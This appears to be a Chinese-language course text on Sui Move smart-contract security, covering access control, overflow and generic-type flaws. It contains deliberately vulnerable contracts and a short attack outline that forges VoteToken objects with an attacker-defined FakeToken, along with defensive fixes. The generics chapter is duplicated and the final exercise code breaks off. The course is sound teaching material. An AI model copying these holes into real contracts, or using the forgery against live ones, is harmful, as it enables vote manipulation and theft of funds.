<h4 id="3-权限控制不足"><a class="header" href="#3-权限控制不足">3. 权限控制不足</a></h4>
<ul>
<li><strong>问题</strong>：函数未限制调用者身份，允许任何人执行敏感操作。</li>
<li><strong>详细说明</strong>：
<ul>
<li>Move 的 public entry fun 默认对所有地址开放，需手动验证 tx_context::sender.</li>
<li>Sui 的共享对象尤其需注意权限。</li>
</ul>
</li>
<li><strong>示例</strong>：
<pre><code>public entry fun reset_counter(counter: &amp;mut Counter) { // 未验证调用者
  counter.count = 0; 
}
</code></pre>
<ul>
<li>任何人都可重置计数器。</li>
</ul>
</li>
<li><strong>更实际示例</strong>：
<pre><code>public struct SuiPool has key {
    id: UID,
    suiBalance: Balance&lt;0x2::sui::SUI&gt;,
}

public entry fun withdraw_commision(
    suipool: &amp;mut SuiPool,
    amount: u64,
    to: address,
    ctx: &amp;mut TxContext,
) {
    assert!(suipool.suiBalance.value() &gt; amount, 1);
    let coin_balance = suipool.suiBalance.split(amount);
    let coin = from_balance(coin_balance, ctx);
    public_transfer(coin, to);
}
</code></pre>
<ul>
<li>非管理者可提取余额。</li>
</ul>
</li>
<li><strong>影响</strong>：
<ul>
<li>未授权用户可能破坏合约状态或窃取资源。</li>
</ul>
</li>
</ul>
<h4 id="4-整数溢出下溢"><a class="header" href="#4-整数溢出下溢">4. 整数溢出/下溢</a></h4>
<ul>
<li><strong>问题</strong>：在 Sui 中，Move 的整数运算（如 u64 的加法、减法）默认启用溢出检查，溢出或下溢会导致交易失败.</li>
<li><strong>示例</strong>：
<pre><code>module counter::counter{
    use sui::event;

    public struct Counter has key {
        id: UID,
        count: u64,
    }

    public struct CounterEmit has copy, drop{
        count: u64,
    }

    fun init(ctx: &amp;mut TxContext){
        transfer::share_object(Counter { id:object::new(ctx), count: 0 });
    }

    public entry fun add(counter: &amp;mut Counter,amount: u64){
        counter.count = counter.count + amount;
        event::emit(CounterEmit { count: counter.count })
    }

    public entry fun reduce(counter: &amp;mut Counter,amount: u64){
        counter.count = counter.count - amount;
        event::emit(CounterEmit { count: counter.count })
    }
}
</code></pre>
</li>
<li><strong>影响</strong>：
<ul>
<li>若 counter + amount &gt; 2^64 - 1 或 counter - amount &lt; 0 会抛出 MovePrimitiveRuntimeError，交易失败，无法继续执行。</li>
</ul>
</li>
</ul>
<h4 id="5-资源管理不当"><a class="header" href="#5-资源管理不当">5. 资源管理不当</a></h4>
<ul>
<li><strong>问题</strong>：资源未正确转移或销毁，导致编译错误。</li>
<li><strong>示例</strong>：
<pre><code>public entry fun create_coin(ctx: &amp;mut TxContext) {
  let coin = Coin { id: object::new(ctx), value: 100 };
}
</code></pre>
</li>
<li><strong>影响</strong>：
<ul>
<li>编译错误。</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践识别与修复简单漏洞"><a class="header" href="#实践识别与修复简单漏洞">实践：识别与修复简单漏洞</a></h1>
<h2 id="题目描述-1"><a class="header" href="#题目描述-1">题目描述</a></h2>
<p>在本实践环节，你将审计一个简单的 Sui Move 合约 chapter_2::simple_challenge，目标是识别其中的漏洞并提出修复建议。合约实现了一个简单的“计数挑战”：用户可以通过提交计数（increment_count）来增加计数器，达到目标值后领取奖励（claim_reward）。奖励是共享的，任何人都可以领取。然而，合约存在一些隐藏漏洞，其中一个可能导致运行时报错，你需要找到这些漏洞，分析其影响，并提出修复建议。</p>
<h2 id="示例代码-1"><a class="header" href="#示例代码-1">示例代码</a></h2>
<p>以下是 chapter_2::simple_challenge 模块的代码：</p>
<p>move</p>
<pre><code class="language-text">module chapter_2::simple_challenge {
    use sui::object::{Self, UID};
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use sui::event;

    public struct Challenge has key {
        id: UID,
        owner: address,
        count: u64,
        target_count: u64,
        reward: u64,
        total_rewards_claimed: u64,
        total_attempts: u64,
    }

    public struct RewardEvent has copy, drop {
        reward: u64,
    }

    fun init(ctx: &amp;mut TxContext) {
        let challenge = Challenge {
            id: object::new(ctx),
            owner: tx_context::sender(ctx),
            count: 0,
            target_count: 10,
            reward: 1000,
            total_rewards_claimed: 0,
            total_attempts: 0,
        };
        transfer::share_object(challenge);
    }

    public entry fun increment_count(challenge: &amp;mut Challenge) {
        challenge.total_attempts = challenge.total_attempts + 1;
        challenge.count = challenge.count + 1;
    }

    public entry fun claim_reward(challenge: &amp;mut Challenge, ctx: &amp;mut TxContext) {
        if (challenge.count &gt;= challenge.target_count) {
            challenge.total_rewards_claimed = challenge.total_rewards_claimed + challenge.reward;
            event::emit(RewardEvent { reward: challenge.reward });
            challenge.count = 0;
        };
    }
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="第3章泛型类型安全"><a class="header" href="#第3章泛型类型安全">第3章：泛型类型安全</a></h1>
<h2 id="引言"><a class="header" href="#引言">引言</a></h2>
<p>在区块链智能合约开发中，安全性是核心关注点。Sui Move 作为一种专为高性能区块链设计的语言，通过其强大的类型系统为开发者提供了安全保障。然而，某些特性如果使用不当，可能引入严重漏洞。本章将聚焦 <strong>Sui Move 的泛型（Generics）</strong>，深入探讨其在智能合约中的应用以及未检查泛型类型带来的安全风险。</p>
<hr />
<h2 id="1-sui-move-中的泛型"><a class="header" href="#1-sui-move-中的泛型">1. Sui Move 中的泛型</a></h2>
<h3 id="11-什么是泛型"><a class="header" href="#11-什么是泛型">1.1 什么是泛型？</a></h3>
<p>泛型是编程语言中的一种机制，允许开发者编写可以处理多种类型的通用代码，从而提高代码的灵活性和复用性。在 Sui Move 中，泛型通过类型参数（如 <code>&lt;T&gt;</code>）实现，类型参数可以在结构体、函数或模块定义中使用，指定在运行时替换的具体类型，类型参数通过尖括号 <code>&lt;T&gt;</code> 定义。</p>
<p>例如，在合约中，<code>VoteToken</code> 结构体使用泛型 <code>&lt;T&gt;</code> 表示投票凭证的类型：</p>
<pre><code>public struct VoteToken&lt;phantom T&gt; has key, store {
    id: UID,
    amount: u64,
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 是类型参数，可以代表任何类型（如 <code>OfficialToken</code> 或攻击者定义的 <code>FakeToken</code>）。</li>
<li><code>phantom</code> 关键字表示 <code>&lt;T&gt;</code> 仅用于类型标记，不影响 <code>VoteToken</code> 的存储结构（即不会在链上存储 <code>&lt;T&gt;</code> 的实例）。</li>
<li><code>has key, store</code> 表明 <code>VoteToken</code> 是一个链上对象，可以存储和转移。</li>
</ul>
<p>泛型的核心优势是允许开发者编写通用的逻辑，而无需为每种类型重复实现代码。</p>
<h3 id="12-泛型的语法与能力"><a class="header" href="#12-泛型的语法与能力">1.2 泛型的语法与能力</a></h3>
<p>在 Sui Move 中，泛型的使用受到类型能力的约束：</p>
<ul>
<li>
<p><strong>结构体泛型</strong>：如 <code>VoteToken&lt;phantom T&gt;</code>，类型参数 <code>&lt;T&gt;</code> 通常需要满足特定能力（如 <code>drop</code> 或 <code>store</code>）。例如，<code>phantom</code> 参数通常要求 <code>drop</code> 能力。</p>
</li>
<li>
<p><strong>函数泛型</strong>：函数可以声明泛型参数，限制调用时传入的类型。例如：</p>
<pre><code>public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
  let sender = tx_context::sender(ctx);
  let token = VoteToken&lt;T&gt; {
      id: object::new(ctx),
      amount: 100,
  };
  public_transfer(token, sender);
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 允许函数为任意类型创建 <code>VoteToken</code>。</li>
<li>调用者可以在调用时指定具体类型，如 <code>register_voter&lt;0x1::Token::Token&gt;</code>。</li>
</ul>
</li>
<li>
<p><strong>多类型参数</strong>：支持多个类型参数，顺序重要。例如：</p>
<pre><code>public struct Pair&lt;T, U&gt; {
  first: T,
  second: U,
}
public fun new_pair&lt;T, U&gt;(first: T, second: U): Pair&lt;T, U&gt; {
  Pair { first, second }
}
</code></pre>
<ul>
<li><code>&lt;T, U&gt;</code> 的顺序决定类型签名，<code>Pair&lt;u8, bool&gt;</code> 和 <code>Pair&lt;bool, u8&gt;</code> 是不同类型，无法直接比较。</li>
</ul>
</li>
<li>
<p><strong>幻影类型参数</strong>：未在字段或方法中使用的类型参数，用于区分类型。例如：</p>
<pre><code>public struct Coin&lt;phantom T&gt; {
  value: u64
}

public struct USD {}
public struct EUR {}

#[test]
fun test_phantom_type() {
    let coin1: Coin&lt;USD&gt; = Coin { value: 10 };
    let coin2: Coin&lt;EUR&gt; = Coin { value: 20 };

    // Unpacking is identical because the phantom type parameter is not used.
    let Coin { value: _ } = coin1;
    let Coin { value: _ } = coin2;
}
</code></pre>
<ul>
<li><code>Coin&lt;USD&gt;</code> 和 <code>Coin&lt;EUR&gt;</code> 使用 <code>&lt;T&gt;</code> 区分不同货币，防止混淆。</li>
</ul>
</li>
<li>
<p><strong>能力约束</strong>：类型参数可通过能力约束（如 <code>T: drop</code>）限制行为。例如：</p>
<pre><code>public struct Droppable&lt;T: drop&gt; {
  value: T,
}
public struct CopyableDroppable&lt;T: copy + drop&gt; {
  value: T,
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 必须具有指定能力，否则编译器报错。例如，<code>NoAbilities</code> 结构体无能力，无法用于 <code>Droppable&lt;NoAbilities&gt;</code>.</li>
</ul>
</li>
</ul>
<h3 id="13-泛型的应用场景"><a class="header" href="#13-泛型的应用场景">1.3 泛型的应用场景</a></h3>
<p>在 Sui Move 智能合约中，泛型广泛应用于：</p>
<ul>
<li><strong>资源标识</strong>：如 <code>VoteToken&lt;T&gt;</code>，通过 <code>&lt;T&gt;</code> 区分不同类型的凭证（如治理代币、投票权）。</li>
<li><strong>模块复用</strong>：编写通用逻辑，适配多种类型。例如，<code>vote&lt;T&gt;</code> 函数处理不同类型的 <code>VoteToken</code>。</li>
<li><strong>跨模块交互</strong>：泛型支持模块与外部类型交互，增加灵活性。</li>
<li><strong>标准库</strong>：如 <code>vector&lt;T&gt;</code>（动态数组）和 <code>Option&lt;T&gt;</code>（可选值），分别存储任意类型序列和表示可能缺失的值。</li>
<li><strong>抽象实现</strong>：定义通用接口或行为，允许不同类型共享逻辑。</li>
</ul>
<p>在样例合约中，泛型用于：</p>
<ul>
<li><code>VoteToken&lt;phantom T&gt;</code>：标记投票凭证的合法性。</li>
<li><code>register_voter&lt;T&gt;</code> 和 <code>vote&lt;T&gt;</code>：支持不同类型凭证的分配和使用。</li>
</ul>
<p>然而，这种灵活性可能被攻击者利用，导致安全漏洞。</p>
<hr />
<h2 id="2-未检查泛型类型的安全风险"><a class="header" href="#2-未检查泛型类型的安全风险">2. 未检查泛型类型的安全风险</a></h2>
<h3 id="21-泛型漏洞的本质"><a class="header" href="#21-泛型漏洞的本质">2.1 泛型漏洞的本质</a></h3>
<p>在 Sui Move 中，泛型类型是由调用者在运行时提供的“用户输入”。如果合约未验证泛型类型 <code>&lt;T&gt;</code> 是否符合预期，攻击者可以传入任意类型，导致以下安全问题：</p>
<ul>
<li><strong>伪造凭证</strong>：攻击者创建非法类型的对象（如 <code>VoteToken&lt;FakeToken&gt;</code>）绕过权限检查。</li>
<li><strong>逻辑破坏</strong>：非预期类型导致合约状态异常，影响核心功能（如投票结果错误）。</li>
<li><strong>资源滥用</strong>：攻击者利用伪造类型创建无效资源，干扰合约运行或耗尽 Gas.</li>
</ul>
<p>在 <code>VoteChain</code> 合约中，<code>register_voter&lt;T&gt;</code> 和 <code>vote&lt;T&gt;</code> 函数未检查 <code>&lt;T&gt;</code> 类型，存在严重漏洞：</p>
<pre><code>public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
    let sender = tx_context::sender(ctx);
    let token = VoteToken&lt;T&gt; {
        id: object::new(ctx),
        amount: 100,
    };
    public_transfer(token, sender);
}

public entry fun vote&lt;T&gt;(store: &amp;mut VoteStore, token: &amp;VoteToken&lt;T&gt;, proposal_id: u64) {
    assert!(token.amount &gt; 0, 1);
    assert!(object_table::contains(&amp;store.proposals, proposal_id), 2);
    let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_id);
    proposal.votes = proposal.votes + token.amount;
}
</code></pre>
<ul>
<li><strong>漏洞</strong>：<code>register_voter&lt;T&gt;</code> 允许任何 <code>&lt;T&gt;</code> 创建 <code>VoteToken</code>，<code>vote&lt;T&gt;</code> 未验证 <code>token</code> 的类型。</li>
<li><strong>后果</strong>：攻击者可以伪造 <code>VoteToken</code> 并投票，非法影响提案结果.</li>
</ul>
<h3 id="22-漏洞案例分析"><a class="header" href="#22-漏洞案例分析">2.2 漏洞案例分析</a></h3>
<p>假设 <code>VoteChain</code> 是一个去中心化投票系统，设计意图是只有持有 <code>OfficialToken</code> 类型凭证的用户才能投票。然而，由于泛 type漏洞，攻击者可以：</p>
<ol>
<li>定义一个伪造类型 <code>FakeToken</code>:</li>
</ol>
<pre><code>module attacker::fake_token {
 public struct FakeToken has drop {}
}
</code></pre>
<ol start="2">
<li>调用 <code>register_voter&lt;attacker::fake_token::FakeToken&gt;</code> 获取 <code>VoteToken&lt;FakeToken&gt;</code>.</li>
<li>使用伪造的 <code>VoteToken&lt;FakeToken&gt;</code> 调用 <code>vote</code>，增加任意提案的票数。</li>
</ol>
<p>这种攻击在区块链 CTF 中非常常见，因为泛型类型作为“隐形输入”，容易被开发者忽视。在现实世界的治理合约或 DeFi 协议中，类似漏洞可能导致：</p>
<ul>
<li>非法用户控制投票结果。</li>
<li>资金分配错误。</li>
<li>协议治理被恶意操纵。</li>
</ul>
<h3 id="23-漏洞的影响"><a class="header" href="#23-漏洞的影响">2.3 漏洞的影响</a></h3>
<p>未检查泛型类型的漏洞可能导致：</p>
<ul>
<li><strong>完整性破坏</strong>：投票系统等依赖权限控制的合约可能被非法操作。</li>
<li><strong>经济损失</strong>：在 DeFi 或 DAO 中，伪造凭证可能导致资金被窃取或错误分配。</li>
<li><strong>拒绝服务</strong>：攻击者可能创建大量伪造对象，增加 Gas 消耗或干扰正常功能。</li>
</ul>
<p>在 <code>VoteChain</code> 的场景中，攻击者通过伪造 <code>VoteToken</code> 可以：</p>
<ul>
<li>使无效用户参与投票，破坏提案的公平性。</li>
<li>操纵提案结果，影响治理决策。</li>
<li>降低系统的可信度，损害用户信任。</li>
</ul>
<hr />
<h2 id="3-防御泛型漏洞"><a class="header" href="#3-防御泛型漏洞">3. 防御泛型漏洞</a></h2>
<h3 id="31-使用-stdtype_name-进行类型检查"><a class="header" href="#31-使用-stdtype_name-进行类型检查">3.1 使用 <code>std::type_name</code> 进行类型检查</a></h3>
<p>Sui Move 提供了 <code>std::type_name</code> 模块，用于在运行时检查类型的名称。开发者可以在合约中添加断言，确保泛型类型 <code>&lt;T&gt;</code> 符合预期：</p>
<pre><code>use std::type_name;

public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
    assert!(type_name::get&lt;T&gt;() == type_name::get&lt;votechain::OfficialToken&gt;(), 3);
    let sender = tx_context::sender(ctx);
    let token = VoteToken&lt;T&gt; {
        id: object::new(ctx),
        amount: 100,
    };
    public_transfer(token, sender);
}
</code></pre>
<ul>
<li><code>type_name::get&lt;T&gt;()</code> 返回 <code>&lt;T&gt;</code> 的完整类型名称（包括模块和结构体名称，如 <code>votechain::OfficialToken</code>）。</li>
<li>断言确保 <code>&lt;T&gt;</code> 是 <code>votechain::OfficialToken</code>，否则中止交易。</li>
<li>错误码 <code>3</code>（建议定义为常量，如 <code>const E_INVALID_TYPE: u64 = 3;</code>）便于调试。</li>
</ul>
<p>这种方法通过限制 <code>&lt;T&gt;</code> 到白名单类型，有效防止伪造凭证。</p>
<h3 id="32-设计安全合约的注意事项"><a class="header" href="#32-设计安全合约的注意事项">3.2 设计安全合约的注意事项</a></h3>
<ul>
<li><strong>最小化泛型使用</strong>：仅在必要时使用泛型，避免过度灵活性。</li>
<li><strong>显式验证</strong>：对所有泛型参数进行运行时检查。</li>
<li><strong>错误处理</strong>：定义清晰的错误码，便于调试和审计。</li>
<li><strong>测试覆盖</strong>：编写测试用例，模拟攻击者伪造类型的情景。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="了解泛型类型安全"><a class="header" href="#了解泛型类型安全">了解泛型类型安全</a></h1>
<h2 id="引言-1"><a class="header" href="#引言-1">引言</a></h2>
<p>在区块链智能合约开发中，安全性是核心关注点。Sui Move 作为一种专为高性能区块链设计的语言，通过其强大的类型系统为开发者提供了安全保障。然而，某些特性如果使用不当，可能引入严重漏洞。本章将聚焦 <strong>Sui Move 的泛型（Generics）</strong>，深入探讨其在智能合约中的应用以及未检查泛型类型带来的安全风险。</p>
<hr />
<h2 id="1-sui-move-中的泛型-1"><a class="header" href="#1-sui-move-中的泛型-1">1. Sui Move 中的泛型</a></h2>
<h3 id="11-什么是泛型-1"><a class="header" href="#11-什么是泛型-1">1.1 什么是泛型？</a></h3>
<p>泛型是编程语言中的一种机制，允许开发者编写可以处理多种类型的通用代码，从而提高代码的灵活性和复用性。在 Sui Move 中，泛型通过类型参数（如 <code>&lt;T&gt;</code>）实现，类型参数可以在结构体、函数或模块定义中使用，指定在运行时替换的具体类型，类型参数通过尖括号 <code>&lt;T&gt;</code> 定义。</p>
<p>例如，在合约中，<code>VoteToken</code> 结构体使用泛型 <code>&lt;T&gt;</code> 表示投票凭证的类型：</p>
<pre><code>public struct VoteToken&lt;phantom T&gt; has key, store {
    id: UID,
    amount: u64,
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 是类型参数，可以代表任何类型（如 <code>OfficialToken</code> 或攻击者定义的 <code>FakeToken</code>）。</li>
<li><code>phantom</code> 关键字表示 <code>&lt;T&gt;</code> 仅用于类型标记，不影响 <code>VoteToken</code> 的存储结构（即不会在链上存储 <code>&lt;T&gt;</code> 的实例）。</li>
<li><code>has key, store</code> 表明 <code>VoteToken</code> 是一个链上对象，可以存储和转移。</li>
</ul>
<p>泛型的核心优势是允许开发者编写通用的逻辑，而无需为每种类型重复实现代码。</p>
<h3 id="12-泛型的语法与能力-1"><a class="header" href="#12-泛型的语法与能力-1">1.2 泛型的语法与能力</a></h3>
<p>在 Sui Move 中，泛型的使用受到类型能力的约束：</p>
<ul>
<li>
<p><strong>结构体泛型</strong>：如 <code>VoteToken&lt;phantom T&gt;</code>，类型参数 <code>&lt;T&gt;</code> 通常需要满足特定能力（如 <code>drop</code> 或 <code>store</code>）。例如，<code>phantom</code> 参数通常要求 <code>drop</code> 能力。</p>
</li>
<li>
<p><strong>函数泛型</strong>：函数可以声明泛型参数，限制调用时传入的类型。例如：</p>
<pre><code>public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
  let sender = tx_context::sender(ctx);
  let token = VoteToken&lt;T&gt; {
      id: object::new(ctx),
      amount: 100,
  };
  public_transfer(token, sender);
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 允许函数为任意类型创建 <code>VoteToken</code>。</li>
<li>调用者可以在调用时指定具体类型，如 <code>register_voter&lt;0x1::Token::Token&gt;</code>。</li>
</ul>
</li>
<li>
<p><strong>多类型参数</strong>：支持多个类型参数，顺序重要。例如：</p>
<pre><code>public struct Pair&lt;T, U&gt; {
  first: T,
  second: U,
}
public fun new_pair&lt;T, U&gt;(first: T, second: U): Pair&lt;T, U&gt; {
  Pair { first, second }
}
</code></pre>
<ul>
<li><code>&lt;T, U&gt;</code> 的顺序决定类型签名，<code>Pair&lt;u8, bool&gt;</code> 和 <code>Pair&lt;bool, u8&gt;</code> 是不同类型，无法直接比较。</li>
</ul>
</li>
<li>
<p><strong>幻影类型参数</strong>：未在字段或方法中使用的类型参数，用于区分类型。例如：</p>
<pre><code>public struct Coin&lt;phantom T&gt; {
  value: u64
}

public struct USD {}
public struct EUR {}

#[test]
fun test_phantom_type() {
    let coin1: Coin&lt;USD&gt; = Coin { value: 10 };
    let coin2: Coin&lt;EUR&gt; = Coin { value: 20 };

    // Unpacking is identical because the phantom type parameter is not used.
    let Coin { value: _ } = coin1;
    let Coin { value: _ } = coin2;
}
</code></pre>
<ul>
<li><code>Coin&lt;USD&gt;</code> 和 <code>Coin&lt;EUR&gt;</code> 使用 <code>&lt;T&gt;</code> 区分不同货币，防止混淆。</li>
</ul>
</li>
<li>
<p><strong>能力约束</strong>：类型参数可通过能力约束（如 <code>T: drop</code>）限制行为。例如：</p>
<pre><code>public struct Droppable&lt;T: drop&gt; {
  value: T,
}
public struct CopyableDroppable&lt;T: copy + drop&gt; {
  value: T,
}
</code></pre>
<ul>
<li><code>&lt;T&gt;</code> 必须具有指定能力，否则编译器报错。例如，<code>NoAbilities</code> 结构体无能力，无法用于 <code>Droppable&lt;NoAbilities&gt;</code>.</li>
</ul>
</li>
</ul>
<h3 id="13-泛型的应用场景-1"><a class="header" href="#13-泛型的应用场景-1">1.3 泛型的应用场景</a></h3>
<p>在 Sui Move 智能合约中，泛型广泛应用于：</p>
<ul>
<li><strong>资源标识</strong>：如 <code>VoteToken&lt;T&gt;</code>，通过 <code>&lt;T&gt;</code> 区分不同类型的凭证（如治理代币、投票权）。</li>
<li><strong>模块复用</strong>：编写通用逻辑，适配多种类型。例如，<code>vote&lt;T&gt;</code> 函数处理不同类型的 <code>VoteToken</code>。</li>
<li><strong>跨模块交互</strong>：泛型支持模块与外部类型交互，增加灵活性。</li>
<li><strong>标准库</strong>：如 <code>vector&lt;T&gt;</code>（动态数组）和 <code>Option&lt;T&gt;</code>（可选值），分别存储任意类型序列和表示可能缺失的值。</li>
<li><strong>抽象实现</strong>：定义通用接口或行为，允许不同类型共享逻辑。</li>
</ul>
<p>在样例合约中，泛型用于：</p>
<ul>
<li><code>VoteToken&lt;phantom T&gt;</code>：标记投票凭证的合法性。</li>
<li><code>register_voter&lt;T&gt;</code> 和 <code>vote&lt;T&gt;</code>：支持不同类型凭证的分配和使用。</li>
</ul>
<p>然而，这种灵活性可能被攻击者利用，导致安全漏洞。</p>
<hr />
<h2 id="2-未检查泛型类型的安全风险-1"><a class="header" href="#2-未检查泛型类型的安全风险-1">2. 未检查泛型类型的安全风险</a></h2>
<h3 id="21-泛型漏洞的本质-1"><a class="header" href="#21-泛型漏洞的本质-1">2.1 泛型漏洞的本质</a></h3>
<p>在 Sui Move 中，泛型类型是由调用者在运行时提供的“用户输入”。如果合约未验证泛型类型 <code>&lt;T&gt;</code> 是否符合预期，攻击者可以传入任意类型，导致以下安全问题：</p>
<ul>
<li><strong>伪造凭证</strong>：攻击者创建非法类型的对象（如 <code>VoteToken&lt;FakeToken&gt;</code>）绕过权限检查。</li>
<li><strong>逻辑破坏</strong>：非预期类型导致合约状态异常，影响核心功能（如投票结果错误）。</li>
<li><strong>资源滥用</strong>：攻击者利用伪造类型创建无效资源，干扰合约运行或耗尽 Gas.</li>
</ul>
<p>在 <code>VoteChain</code> 合约中，<code>register_voter&lt;T&gt;</code> 和 <code>vote&lt;T&gt;</code> 函数未检查 <code>&lt;T&gt;</code> 类型，存在严重漏洞：</p>
<pre><code>public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
    let sender = tx_context::sender(ctx);
    let token = VoteToken&lt;T&gt; {
        id: object::new(ctx),
        amount: 100,
    };
    public_transfer(token, sender);
}

public entry fun vote&lt;T&gt;(store: &amp;mut VoteStore, token: &amp;VoteToken&lt;T&gt;, proposal_id: u64) {
    assert!(token.amount &gt; 0, 1);
    assert!(object_table::contains(&amp;store.proposals, proposal_id), 2);
    let proposal = object_table::borrow_mut(&amp;mut store.proposals, proposal_id);
    proposal.votes = proposal.votes + token.amount;
}
</code></pre>
<ul>
<li><strong>漏洞</strong>：<code>register_voter&lt;T&gt;</code> 允许任何 <code>&lt;T&gt;</code> 创建 <code>VoteToken</code>，<code>vote&lt;T&gt;</code> 未验证 <code>token</code> 的类型。</li>
<li><strong>后果</strong>：攻击者可以伪造 <code>VoteToken</code> 并投票，非法影响提案结果.</li>
</ul>
<h3 id="22-漏洞案例分析-1"><a class="header" href="#22-漏洞案例分析-1">2.2 漏洞案例分析</a></h3>
<p>假设 <code>VoteChain</code> 是一个去中心化投票系统，设计意图是只有持有 <code>OfficialToken</code> 类型凭证的用户才能投票。然而，由于泛 type漏洞，攻击者可以：</p>
<ol>
<li>定义一个伪造类型 <code>FakeToken</code>:</li>
</ol>
<pre><code>module attacker::fake_token {
 public struct FakeToken has drop {}
}
</code></pre>
<ol start="2">
<li>调用 <code>register_voter&lt;attacker::fake_token::FakeToken&gt;</code> 获取 <code>VoteToken&lt;FakeToken&gt;</code>.</li>
<li>使用伪造的 <code>VoteToken&lt;FakeToken&gt;</code> 调用 <code>vote</code>，增加任意提案的票数。</li>
</ol>
<p>这种攻击在区块链 CTF 中非常常见，因为泛型类型作为“隐形输入”，容易被开发者忽视。在现实世界的治理合约或 DeFi 协议中，类似漏洞可能导致：</p>
<ul>
<li>非法用户控制投票结果。</li>
<li>资金分配错误。</li>
<li>协议治理被恶意操纵。</li>
</ul>
<h3 id="23-漏洞的影响-1"><a class="header" href="#23-漏洞的影响-1">2.3 漏洞的影响</a></h3>
<p>未检查泛型类型的漏洞可能导致：</p>
<ul>
<li><strong>完整性破坏</strong>：投票系统等依赖权限控制的合约可能被非法操作。</li>
<li><strong>经济损失</strong>：在 DeFi 或 DAO 中，伪造凭证可能导致资金被窃取或错误分配。</li>
<li><strong>拒绝服务</strong>：攻击者可能创建大量伪造对象，增加 Gas 消耗或干扰正常功能。</li>
</ul>
<p>在 <code>VoteChain</code> 的场景中，攻击者通过伪造 <code>VoteToken</code> 可以：</p>
<ul>
<li>使无效用户参与投票，破坏提案的公平性。</li>
<li>操纵提案结果，影响治理决策。</li>
<li>降低系统的可信度，损害用户信任。</li>
</ul>
<hr />
<h2 id="3-防御泛型漏洞-1"><a class="header" href="#3-防御泛型漏洞-1">3. 防御泛型漏洞</a></h2>
<h3 id="31-使用-stdtype_name-进行类型检查-1"><a class="header" href="#31-使用-stdtype_name-进行类型检查-1">3.1 使用 <code>std::type_name</code> 进行类型检查</a></h3>
<p>Sui Move 提供了 <code>std::type_name</code> 模块，用于在运行时检查类型的名称。开发者可以在合约中添加断言，确保泛型类型 <code>&lt;T&gt;</code> 符合预期：</p>
<pre><code>use std::type_name;

public entry fun register_voter&lt;T&gt;(ctx: &amp;mut TxContext) {
    assert!(type_name::get&lt;T&gt;() == type_name::get&lt;votechain::OfficialToken&gt;(), 3);
    let sender = tx_context::sender(ctx);
    let token = VoteToken&lt;T&gt; {
        id: object::new(ctx),
        amount: 100,
    };
    public_transfer(token, sender);
}
</code></pre>
<ul>
<li><code>type_name::get&lt;T&gt;()</code> 返回 <code>&lt;T&gt;</code> 的完整类型名称（包括模块和结构体名称，如 <code>votechain::OfficialToken</code>）。</li>
<li>断言确保 <code>&lt;T&gt;</code> 是 <code>votechain::OfficialToken</code>，否则中止交易。</li>
<li>错误码 <code>3</code>（建议定义为常量，如 <code>const E_INVALID_TYPE: u64 = 3;</code>）便于调试。</li>
</ul>
<p>这种方法通过限制 <code>&lt;T&gt;</code> 到白名单类型，有效防止伪造凭证。</p>
<h3 id="32-设计安全合约的注意事项-1"><a class="header" href="#32-设计安全合约的注意事项-1">3.2 设计安全合约的注意事项</a></h3>
<ul>
<li><strong>最小化泛型使用</strong>：仅在必要时使用泛型，避免过度灵活性。</li>
<li><strong>显式验证</strong>：对所有泛型参数进行运行时检查。</li>
<li><strong>错误处理</strong>：定义清晰的错误码，便于调试和审计。</li>
<li><strong>测试覆盖</strong>：编写测试用例，模拟攻击者伪造类型的情景。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="实践利用泛型漏洞伪造投票凭证"><a class="header" href="#实践利用泛型漏洞伪造投票凭证">实践：利用泛型漏洞伪造投票凭证。</a></h1>
<h2 id="引言-2"><a class="header" href="#引言-2">引言</a></h2>
<p>以下是一个简单的投票系统的合约，每个地址可以领取100数量的coin然后进行投票，但是存在一些漏洞问题请尝试找出问题。</p>
<pre><code>module votechain::vote {
    use sui::object_table::{Self, ObjectTable};
    use sui::coin::{Self,TreasuryCap};
    use sui::transfer::{public_transfer, share_object, public_freeze_object};
    use std::string::String;
    use sui::table::{Self, Table};

    public struct VOTE has drop {}

    public struct Votecap has key {
        id: UID,
        cap: TreasuryCap&lt;VOTE&gt;
    }

    public struct Mintlist has key {
        id: UID,
        mintlist: Table&lt;address, u64&gt;
    }

    public struct VoteToken&lt;phantom T&gt; has key, store {
        id: UID,
        amount: u64,
    }

    public struct VoteStore has key {
        id: UID,
        proposals: ObjectTable&lt;String, Proposal&gt;,
    }

    public struct Proposal has key, store {
        id: UID,
        votes: u64,
    }


    fun init(waitness: VOTE,ctx: &amp;mut TxContext) {
        let name = std::string::utf8(b"letsctf");

        let mintlist = Mintlist { id: object::new(ctx) , mintlist: table::new(ctx) };
        let mut store = VoteStore {
            id: object::new(ctx),
            proposals: object_table::new(ctx),
        };

        let proposal = Proposal {
            id: object::new(ctx),
            votes: 0,
        };

        let (treasury_cap, meta) = coin::create_currency(waitness,6,b"VOTE", b"VOTE", b"", option::none(), ctx);
  
        let vote_cap = Votecap { id: object::new(ctx), cap: treasury_cap };

        object_table::add(&amp;mut store.proposals, name, proposal);
        public_freeze_object(meta);
        share_object(vote_cap);
        share_object(mintlist);
        share_object(store);
    }

    public entry fun mint(
        vote_cap: &amp;mut Votecap,
        mint_list: &amp;mut Mintlist,
        ctx: &amp;mut TxContext
    ){
        let addr = ctx.sender();
        assert!(!table::contains(&amp;mint_list.mintlist, addr), 1);
        let coin = coin::mint(&amp;mut vote_cap.cap, 100, ctx);
        table::add(&amp;mut mint_list.mintlist, addr, 100);
        public_transfer(coin, addr);
    }

    public entry fun register_voter&lt;T&gt;(vote_coin: coin::Coin&lt;T&gt;, ctx: &amp;mut TxContext) {
        let amount = vote_coin.value();
        assert!(amount == 100,1);
        let sender = tx_context::sender(ctx);
